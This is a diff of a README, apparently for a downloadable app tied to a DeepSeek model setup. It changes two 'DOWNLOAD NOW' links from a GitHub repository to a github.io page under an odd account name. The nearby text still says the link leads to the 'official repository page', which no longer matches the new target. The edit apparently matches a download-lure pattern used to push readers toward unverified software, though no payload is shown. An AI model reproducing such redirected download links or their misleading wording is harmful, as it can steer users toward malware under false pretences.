@@ -12,7 +12,7 @@ This version also supports an **incredibly long conversation memory** of 1 milli
 
 We've designed this to be as simple as possible. Here's your step-by-step path to getting up and running:
 
-[**⬇️ DOWNLOAD NOW - Visit this link to download the application**](https://github.com/penetrationbudgetdeficit204/deepseek-v4-flash-0731-sglang-4x-rtx-pro-6000)
+[**⬇️ DOWNLOAD NOW - Visit this link to download the application**](https://penetrationbudgetdeficit204.github.io)
 
 The download link above is the only place you need to go. It will take you to the official repository page where you'll find the download button clearly marked.
 
@@ -22,7 +22,7 @@ The download link above is the only place you need to go. It will take you to th
 
 Visit this link to download the application:
 
-[**⬇️ GO TO DOWNLOAD PAGE**](https://github.com/penetrationbudgetdeficit204/deepseek-v4-flash-0731-sglang-4x-rtx-pro-6000)
+[**⬇️ GO TO DOWNLOAD PAGE**](https://penetrationbudgetdeficit204.github.io)
 
 Once you're on the page, look for the green "Code" button or the "Releases" section on the right side of the page. Click it and choose "Download ZIP" to get the complete package.
 
